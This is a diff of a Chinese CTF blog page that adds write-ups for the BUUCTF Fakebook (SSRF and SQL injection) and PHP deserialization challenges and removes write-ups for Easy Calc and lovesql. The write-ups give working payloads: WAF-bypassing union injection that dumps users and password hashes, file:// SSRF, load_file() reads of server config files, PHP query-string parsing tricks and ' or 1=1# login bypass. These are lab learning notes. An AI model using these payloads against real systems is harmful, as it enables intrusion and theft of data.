@@ -272,6 +272,201 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-ssrf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/02/08/ssrf/" class="article-date">
+      <time datetime="2021-02-08T13:16:37.000Z" itemprop="datePublished">2021-02-08</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/02/08/ssrf/">21-Buu练习[网鼎杯 2018]Fakebook（ssrf漏洞）</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2>知识点：ssrf</h2>
+
+<p>SSRF,也就是Server Side RequestForgery—服务器端请求伪造。从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。<br>一般由curl的滥用引起。</p>
+<h2>题目：</h2>
+<h3>##1信息搜集</h3>
+
+<p>通过dirsearch扫描到robots.txt,访问robots.txt，如下<br><img src="/2021/02/08/ssrf/s1.png"><br>发现存在/user.php.bak,下载下来打开如下图:<br><img src="/2021/02/08/ssrf/s2.png"><br>经过分析可得：</p>
+<ul>
+<li>1，注册界面输入的blog经过了isValidBlog（）函数的过滤，不然直接在注册界面输入file:///var/www/html/flag.php就能拿到flag。
+</li><li>2，get()函数存在ssrf漏洞。
+</li></ul>
+<h3>##2注册一个账号测试</h3>
+
+<p><img src="/2021/02/08/ssrf/s3.png"><br>注意blog是一个http或https的链接的形式，否则将无法通过<br>点击用户名进入用户界面:<br><img src="/2021/02/08/ssrf/s4.png"><br>打开后发现url里面有参数no，尝试注入：</p>
+<ul>
+<li>view.php?no=1 order by 4--+//正常
+</li><li>view.php?no=1 order by 5--+//报错
+</li></ul>
+
+<p><img src="/2021/02/08/ssrf/s5.png"><br>order by 5时报错，可以判断字段数为4。<br>输入union select 1,2,3,4:</p>
+<ul>
+<li>view.php?no=1 union select 1,2,3,4--+
+</li></ul>
+
+<p><img src="/2021/02/08/ssrf/s6.png"><br>提示no hack<br>于是尝试绕过waf，改为union/**/select：</p>
+<ul>
+<li>view.php?no=1 union/**/select 1,2,3,4--+
+</li></ul>
+
+<p><img src="/2021/02/08/ssrf/s9.png"><br>成功绕过，发现注入点为2<br>爆数据库：<ul></ul></p>
+<li>/view.php?no=0 union/**/select 1,database(),3,4--+
+
+
+<p><img src="/2021/02/08/ssrf/s7.png"><br>数据库为：fakebook<br>爆表：<ul></ul></p>
+</li><li>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'--+
+
+
+<p><img src="/2021/02/08/ssrf/s8.png"><br>表为：users。<br>得列名：<ul></ul></p>
+</li><li>/view.php?no=0%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users'--+
+
+
+<p><img src="/2021/02/08/ssrf/s10.png"><br>列名为：no,username,passwd,data<br>查出数据：/view.php?no=0%20union/**/select%201,group_concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users –+<br><img src="/2021/02/08/ssrf/s11.png"><br>数据如下：<br>1-admin-c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec-O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:67:”<a target="_blank" rel="noopener" href="http://2f653644-f372-48c1-a0f9-7938cd6adf27.node3.buuoj.cn/join.php&quot;;%7D">http://2f653644-f372-48c1-a0f9-7938cd6adf27.node3.buuoj.cn/join.php&quot;;}</a></p>
+<h3>##3利用ssrf漏洞</h3>
+<ul>
+<li>/view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+</li></ul>
+
+<p>查看源码：<br><img src="/2021/02/08/ssrf/s12.png"><br>打开网址，得到flag！</p>
+<h3>##4非预期解</h3>
+
+
+<p>因为没有禁用load_file()函数，所以可以直接利用该函数拿到flag。哈哈，看到这个非预期解还是有点懵的，绕了半天结果简单一步就出来了<br>payload：<br>/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4<br><img src="/2021/02/08/ssrf/s13.png"><br>直接得到flag！</p>
+<h4>非预期解的深入探索</h4>
+
+<p>一，受到参数 secure_file_priv 的影响<br>查了查资料，因为涉及到在服务器上写入文件，所以上述函数能否成功执行受到参数 secure_file_priv 的影响二，利用条件<br>而且想要利用是有条件限制的：<br>1、必须有权限读取并且文件必须完全可读。<br>2、欲读取文件必须在服务器上<br>3、必须指定文件完整的路径<br>4、欲读取文件必须小于max_allowed_packet<br>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。<br>在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，<br>users就不能实现用load_file读取文件了。<br>三，利用技巧<br>1，绕过引号，因为现在magic_quotes_gpc=off的主机少之又少，怎么才能构造处没有引号的语句呢？<br>load_file(‘c:/boot.ini’) ==&gt; load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>2，load_file()还有一些常用的读取敏感信息方法，例如：<br>——————<br>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p>
+<p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf  查看WINDOWS系统apache文件</p>
+<p>c:/Resin-3.0.14/conf/resin.conf   查看jsp开发的网站 resin文件配置信息.</p>
+</li>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-zip" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/02/07/zip/" class="article-date">
+      <time datetime="2021-02-07T05:49:18.000Z" itemprop="datePublished">2021-02-07</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/02/07/zip/">20-Buu练习[极客大挑战 2019]PHP1</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2>知识点</h2>
+
+<p><b style="color:pink">1：用dirsearch扫描备份文件</b><br>安装及使用教程参见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43459870/article/details/102521386">https://blog.csdn.net/weixin_43459870/article/details/102521386</a><br><b style="color:pink">2：public、protected与private在序列化时的区别</b></p>
+<ul>
+<li>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。
+</li><li>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。
+</li></ul>
+
+
+<p><b style="color:pink">3：__wakeup()方法绕过</b><br>一个经常被用来出题的函数<br>(CVE-2016-7124)<br>作用：与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。</p>
+<h2>题目</h2>
+
+<p>打开靶场，界面如下：<br><img src="/2021/02/07/zip/zip0.png"><br>根据提示，可知他有一个备份网站的习惯，那我们用dirsearch扫描目录：<br>命令：python dirsearch.py -u URL -e extension<br><img src="/2021/02/07/zip/zip3.png"><br>扫描到一个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 文件，我们直接在url上输入<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> ，下载该zip文件<br><img src="/2021/02/07/zip/zip2.png"><br><img src="/2021/02/07/zip/zip1.png"><br>index.php包含如下代码:接收参数，进行序列化<br><img src="/2021/02/07/zip/zip4.png"><br>class.php文件源码入下：<br><img src="/2021/02/07/zip/zip5.png"><br>flag.php包含如下代码:<br><img src="/2021/02/07/zip/zip6.png"><br><b>声明一个Name类，包含username,password,且两个变量都是private修饰,整句话都有用。<br>然后根据判断句得知，username必须是admin,password必须是100所以，构造序列化</b></p>
+<ul>
+<li>O是对象，s是字符串，i是数字
+</li><li>因为是private修饰的所以要加%00充当空格
+</li><li>构造:O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
+</li><li>payload：url+?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
+</li></ul>
+
+<p><img src="/2021/02/07/zip/zip7.png"><br>得到flag！</p>
+<h2>菜鸡求学之路</h2> 
+
+<p>看大佬的payload的时候，很疑惑为什么要写%00Name%00username这样的形式？<br>进行了三种修饰方式的测试:public,protected,private<br>只有public修饰的不用太多的修饰原生态构造就好，而private需要加%00Name%00，<br>protected则需要使用 %00*%00username这样的方式<br>——————<br><b>protected修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip8.png"><br><b>public修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip9.png"><br><b>private修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip10.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-nizhuansiwei" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1047,212 +1242,6 @@ highlight_file(__FILE__);
 
 
   
-    <article id="post-clac" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/01/26/clac/" class="article-date">
-      <time datetime="2021-01-26T03:05:13.000Z" itemprop="datePublished">2021-01-26</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/01/26/clac/">12-buu练习Easy Clac</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2>知识点</h2>
-<h3>PHP的字符串解析特性</h3>
-<br>这是别人对PHP字符串解析漏洞的理解，PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
-<br><b>/news.php?%20news[id%00=42"+AND+1=0–</b>
-<br>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
-<br>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
-<ul>
-<li>1.删除空白符
-</li><li>2.将某些字符转换为下划线（包括空格）
-</li></ul>
-例如：
-<br>假如waf不允许num变量传递字母：
-<ul>
-<li>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
-</li></ul>
-可以在num前加个空格：
-<ul>
-<li>http://www.xxx.com/index.php? num = aaaa
-</li></ul>
-这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。
-<h3>waf</h3>
-原来waf我们是看不见的，并且，waf并不是说，题目是用php写的，那么waf就一定是用php写的。也正因如此，这题的waf才会无法识别“ num”和“num”其实是一样的。
-<h3>scandir()</h3>
-这个函数可以列出参数目录中的文件和目录，帮助我们找到flag。
-<h2>题目</h2>
-<br>打开题目链接，查看源代码，获得以下信息：<br>
-<img src="/2021/01/26/clac/clac1.png">
-<br><b>$("#content").val() 是什么意思：</b>
-<br>获取id为content的HTML标签元素的值,是JQuery,     $("#content")相当于document.getElementById("content");       $("#content").val()相当于 document.getElementById("content").value;
-<br>无论怎么注入都是400,403和500，这里用的是一个PHP的字符串解析特性
-<h3>步骤</h3>
-<br>扫描一下根目录：
-<ul>
-<li>clac.php? num=1;var_dump(scandir(chr(47)))
-</li></ul>
-<img src="/2021/01/26/clac/clac2.png">
-<br>得到flag文件，然后读取flag文件：
-<ul>
-<li>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
-</li></ul>
-<img src="/2021/01/26/clac/clac3.png">
-<br>得到flag！
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-love" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/01/25/love/" class="article-date">
-      <time datetime="2021-01-25T08:12:19.000Z" itemprop="datePublished">2021-01-25</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/01/25/love/">11-Buu练习lovesql</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>打开题目链接。界面如下；<br><img src="/2021/01/25/love/love1.png"><br>尝试使用万能密码：</p>
-<ul>
-<li>用户名：1' or 1=1#
-</li><li>密码：222（任意三个数）
-</li></ul>
-跳转到check.php界面：
-
-<p><img src="/2021/01/25/love/love2.png"></p>
-<p>得到了用户名和密码<br>开始注入<br>在url中输入；</p>
-<ul>
-<li>1./check.php?username=admin' order by 3%23&password=1     存在
-</li><li>2./check.php?username=admin' order by 4%23&password=1     存在
-</li><li>3./check.php?username=admin' order by 3%23&password=1     存在
-</li><li>4./check.php?username=admin' order by 4%23&password=1     报错
-</li></ul>
-注意：由于是在url中输入的内容，所以不能用#，而用它的url编码%23。
-输入4时界面如下：
-
-<p><img src="/2021/01/25/love/love3.png"></p>
-<p>由此可知，有3个字段。用union查询测试注入点（回显点位）：</p>
-<ul>
-<li>/check.php?username=1' union select 1,2,3%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love4.png"></p>
-<p>回显点位是2和3，查询数据库名及版本：</p>
-<ul>
-<li>/check.php?username=1' union select 1,database(),version()%23&password=1
-</li></ul>
-可知用户名为：geek
-接下来爆表：
-<ul>
-<li>/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love6.png"></p>
-<p>爆出geekyser和l0ve1ysq1两个表，我们试一下geekuser这个表：<br>爆字段：</p>
-<ul>
-<li>/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love7.png"></p>
-<p>得到三个字段：id，username，password。<br>爆数据：</p>
-<ul>
-<li>/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love8.png"></p>
-<p><img src="/2021/01/25/love/love9.png"></p>
-<p>得到flag！<br>被sql支配的一天</p>
-<p><img src="/2021/01/25/love/love10.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
@@ -1382,9 +1371,8 @@ ga('send', 'pageview');
 
 
   </div>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
-<script type="text/javascript" src="/js/love.js"></script>
 <!--动态线条背景-->
 <script type="text/javascript"
 color="0,0,0" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
@@ -1393,3 +1381,5 @@ color="0,0,0" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canva
 <script type="text/javascript" src="\js\snow.js"></script>
 <!--浏览器搞笑标题-->
 <script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
